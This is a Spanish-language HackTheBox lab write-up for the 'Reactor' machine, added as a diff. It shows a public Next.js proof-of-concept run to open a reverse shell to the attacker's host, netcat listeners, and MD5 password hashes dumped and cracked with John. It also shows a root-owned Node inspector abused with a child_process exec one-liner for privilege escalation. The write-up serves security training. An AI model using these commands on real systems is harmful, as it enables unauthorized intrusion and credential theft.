@@ -1,0 +1,345 @@
+---
+title: Reactor
+featured: true
+lang: es
+image: ../../../../../images/writeups/hackthebox/reactor/reactor.png
+platform: htb
+difficulty: easy
+os: linux
+hints: []
+tags: [hackthebox, linux]
+parent: writeups/hackthebox/machines
+draft: false
+---
+
+<div style="display: flex; justify-content: center;">
+
+![Cap](@images/writeups/hackthebox/reactor/reactor.png)
+
+</div>
+
+<div style="text-align: center;">
+
+[https://app.hackthebox.com/machines/Reactor](https://app.hackthebox.com/machines/Reactor)
+
+</div>
+
+## Enumeration
+
+Escanear todos los puertos para ver cuales están abiertos
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/reactor 10.129.9.110
+```
+
+```plaintext
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl 63
+3000/tcp open  ppp     syn-ack ttl 63
+```
+
+Escanear puertos abiertos para saber que servicios y versiones corren en cada uno
+
+```bash
+nmap -p 22,3000 -sCV -oA nmap/openPorts 10.129.9.110
+```
+
+```plaintext
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
+|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
+3000/tcp open  ppp?
+| fingerprint-strings:
+|   GetRequest:
+|     HTTP/1.1 200 OK
+|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
+|     x-nextjs-cache: HIT
+|     x-nextjs-prerender: 1
+|     x-nextjs-stale-time: 4294967294
+|     X-Powered-By: Next.js
+|     Cache-Control: s-maxage=31536000,
+|     ETag: "p02u6gnhufd8t"
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 17175
+|     Date: Thu, 28 May 2026 22:54:44 GMT
+|     Connection: close
+|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
+|   HTTPOptions:
+|     HTTP/1.1 400 Bad Request
+|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
+|     Allow: GET
+|     Allow: HEAD
+|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
+|     Date: Thu, 28 May 2026 22:54:45 GMT
+|     Connection: close
+|   Help, NCP, RPCCheck:
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|   RTSPRequest:
+|     HTTP/1.1 400 Bad Request
+|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
+|     Allow: GET
+|     Allow: HEAD
+|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
+|     Date: Thu, 28 May 2026 22:54:46 GMT
+|_    Connection: close
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3000-TCP:V=7.99%I=7%D=5/28%Time=6A18C7C1%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,34BC,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-S
+SF:tate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x2
+SF:0Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\
+SF:r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nC
+SF:ache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r
+SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2017
+SF:175\r\nDate:\x20Thu,\x2028\x20May\x202026\x2022:54:44\x20GMT\r\nConnect
+SF:ion:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta
+SF:\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=de
+SF:vice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\
+SF:"/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/
+SF:><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20
+SF:href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20
+SF:src=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\
+SF:"></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.
+SF:js\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x20400\
+SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1
+SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptio
+SF:ns,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Rou
+SF:ter-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetc
+SF:h\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20n
+SF:o-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Thu,
+SF:\x2028\x20May\x202026\x2022:54:45\x20GMT\r\nConnection:\x20close\r\n\r\
+SF:n")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20R
+SF:SC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-
+SF:Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x
+SF:20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r
+SF:\nDate:\x20Thu,\x2028\x20May\x202026\x2022:54:46\x20GMT\r\nConnection:\
+SF:x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
+SF:nConnection:\x20close\r\n\r\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+[http://10.129.9.110:3000/](http://10.129.9.110:3000/)
+
+![Reactor Web](@images/writeups/hackthebox/reactor/reactor-web.png)
+
+<div style="display: flex; justify-content: center;">
+
+![Reactor Wappalyzer](@images/writeups/hackthebox/reactor/reactor-wappalyzer.png)
+
+</div>
+
+**Google** `nextjs 15.0.3 vulnerabilities`
+
+## Exploitation
+
+[https://github.com/p3ta00/react2shell-poc](https://github.com/p3ta00/react2shell-poc)
+
+```bash
+nc -lnvp 1111
+Listening on 0.0.0.0 1111
+```
+
+```bash
+python3 exploit.py -t 10.129.9.110:3000 --revshell --lhost 10.10.15.131 --lport 1111
+```
+
+```bash
+nc -lnvp 1111
+Listening on 0.0.0.0 1111
+Connection received on 10.129.9.110 42388
+bash: cannot set terminal process group (1408): Inappropriate ioctl for device
+bash: no job control in this shell
+node@reactor:/opt/reactor-app$
+```
+
+Interactive shell
+
+```bash
+node@reactor:/opt/reactor-app$ ls
+app  next.config.js  node_modules  package.json  package-lock.json  reactor.db
+node@reactor:/opt/reactor-app$ sqlite3
+SQLite version 3.45.1 2024-01-30 16:01:20
+Enter ".help" for usage hints.
+Connected to a transient in-memory database.
+Use ".open FILENAME" to reopen on a persistent database.
+sqlite> .tables
+sensor_logs  users      
+sqlite> .schema users
+CREATE TABLE users (
+    id INTEGER PRIMARY KEY,
+    username TEXT NOT NULL,
+    password_hash TEXT NOT NULL,
+    role TEXT NOT NULL,
+    email TEXT
+);
+sqlite> select username,password_hash from users;
+admin|a203b22191d744a4e70ada5c101b17b8
+engineer|39d97110eafe2a9a68639812cd271e8e
+```
+
+```bash
+echo 39d97110eafe2a9a68639812cd271e8e > engineer_hash.txt
+```
+
+```bash
+hashcat --identify engineer_hash.txt 
+The following 12 hash-modes match the structure of your input hash:
+
+      # | Name                                                       | Category
+  ======+============================================================+======================================
+    900 | MD4                                                        | Raw Hash
+      0 | MD5                                                        | Raw Hash
+     70 | md5(utf16le($pass))                                        | Raw Hash
+   2600 | md5(md5($pass))                                            | Raw Hash salted and/or iterated
+   3500 | md5(md5(md5($pass)))                                       | Raw Hash salted and/or iterated
+   4400 | md5(sha1($pass))                                           | Raw Hash salted and/or iterated
+  20900 | md5(sha1($pass).md5($pass).sha1($pass))                    | Raw Hash salted and/or iterated
+  32800 | md5(sha1(md5($pass)))                                      | Raw Hash salted and/or iterated
+   4300 | md5(strtoupper(md5($pass)))                                | Raw Hash salted and/or iterated
+   1000 | NTLM                                                       | Operating System
+   9900 | Radmin2                                                    | Operating System
+   8600 | Lotus Notes/Domino 5                                       | Enterprise Application Software (EAS)
+```
+
+```bash
+/opt/john/run/john --format=raw-md5 -w=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt engineer_hash.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=12
+Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+reactor1         (?)     
+1g 0:00:00:00 DONE (2026-05-28 20:41) 3.704g/s 1248Kp/s 1248Kc/s 1248KC/s rhea24..rayland
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed
+```
+
+```bash
+ssh engineer@10.129.9.110
+The authenticity of host '10.129.9.110 (10.129.9.110)' can't be established.
+ED25519 key fingerprint is: SHA256:9v9mCPC4gn2EN/IbKKwhV8KZoNVTsVPorFhlTkNByPM
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:1: 10.129.9.9
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.9.110' (ED25519) to the list of known hosts.
+engineer@10.129.9.110's password: 
+ ____  _____    _    ____ _____ ___  ____  
+|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \ 
+| |_) |  _|   / _ \| |     | || | | | |_) |
+|  _ <| |___ / ___ \ |___  | || |_| |  _ < 
+|_| \_\_____/_/   \_\____| |_| \___/|_| \_\
+
+    ReactorWatch Core Monitoring System
+    Nuclear Dynamics Corp. - Site 7
+    
+    AUTHORIZED PERSONNEL ONLY
+Last login: Thu May 28 23:46:02 2026 from 10.10.15.131
+engineer@reactor:~$ export TERM=xterm
+engineer@reactor:~$ ls
+user.txt
+engineer@reactor:~$ cat user.txt
+```
+
+### User flag
+
+<Callout type="success" title="USER FLAG">
+e2d**************************671  
+</Callout>
+
+## Privilege Escalation
+
+```bash
+engineer@reactor:~$ ls /opt/
+reactor-app  uptime-monitor
+engineer@reactor:~$ ls /opt/uptime-monitor/
+worker.js
+engineer@reactor:~$ ls -l /opt/uptime-monitor/
+total 4
+-rw-r--r-- 1 root root 1684 Apr 27 11:26 worker.js
+```
+
+```bash
+engineer@reactor:~$ ps aux
+<SNIP>
+root        1410  0.0  1.1 1067112 47132 ?       Ssl  20:59   0:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+<SNIP>
+```
+
+```bash
+engineer@reactor:~$ ss -tulpn
+Netid            State             Recv-Q            Send-Q                       Local Address:Port                       Peer Address:Port            Process            
+udp              UNCONN            0                 0                               127.0.0.54:53                              0.0.0.0:*                                  
+udp              UNCONN            0                 0                            127.0.0.53%lo:53                              0.0.0.0:*                                  
+udp              UNCONN            0                 0                                  0.0.0.0:68                              0.0.0.0:*                                  
+tcp              LISTEN            0                 4096                         127.0.0.53%lo:53                              0.0.0.0:*                                  
+tcp              LISTEN            0                 511                              127.0.0.1:9229                            0.0.0.0:*                                  
+tcp              LISTEN            0                 4096                               0.0.0.0:22                              0.0.0.0:*                                  
+tcp              LISTEN            0                 4096                            127.0.0.54:53                              0.0.0.0:*                                  
+tcp              LISTEN            0                 4096                                  [::]:22                                 [::]:*                                  
+tcp              LISTEN            46                511                                      *:3000                                  *:* 
+```
+
+```bash
+engineer@reactor:~$ node inspect 127.0.0.1:9229
+connecting to 127.0.0.1:9229 ... ok
+debug> exec("process.mainModule.require('child_process').execSync('id').toString()")
+'uid=0(root) gid=0(root) groups=0(root)\n'
+```
+
+```bash
+nc -lnvp 2222
+Listening on 0.0.0.0 2222
+```
+
+```bash
+nc -lnvp 2222
+Listening on 0.0.0.0 2222
+Connection received on 10.129.9.110 48808
+bash: cannot set terminal process group (1410): Inappropriate ioctl for device
+bash: no job control in this shell
+root@reactor:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@reactor:/# ls
+ls
+bin
+bin.usr-is-merged
+boot
+cdrom
+dev
+etc
+home
+lib
+lib64
+lib.usr-is-merged
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+sbin.usr-is-merged
+snap
+srv
+sys
+tmp
+usr
+var
+root@reactor:/# cd root
+cd root
+root@reactor:~# ls
+ls
+root.txt
+root@reactor:~# cat root.txt
+cat root.txt
+```
+
+### Root flag
+
+<Callout type="success" title="ROOT FLAG">
+02f**************************301
+</Callout>
